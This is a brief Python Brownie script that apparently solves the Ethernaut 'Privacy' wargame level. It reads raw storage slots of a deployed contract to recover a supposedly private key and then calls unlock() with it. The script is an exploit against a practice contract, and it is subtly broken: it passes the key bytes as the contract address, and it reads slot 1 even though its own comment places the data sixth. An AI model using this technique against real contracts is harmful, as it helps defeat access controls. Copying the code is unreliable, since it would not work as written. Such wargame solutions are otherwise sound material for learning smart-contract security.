from scripts.helpful_scripts import get_account
from brownie import web3, interface


ETHERNAUT_INSTANCE = "0xbf0cdE8daAdF37782fC6c250097a53900BfEEcaD"
GAS_LIMIT = 6000000


def main():

    player = get_account()

    # data is listed as the 6th state variable - need to find it

    store_0 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
    print(store_0)

    store_1 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 1)
    print(store_1)

    data = store_1  # or whichever slot itis in

    key = bytes(data[:16])

    interface.IPrivacy(key).unlock(key, {"from": player})
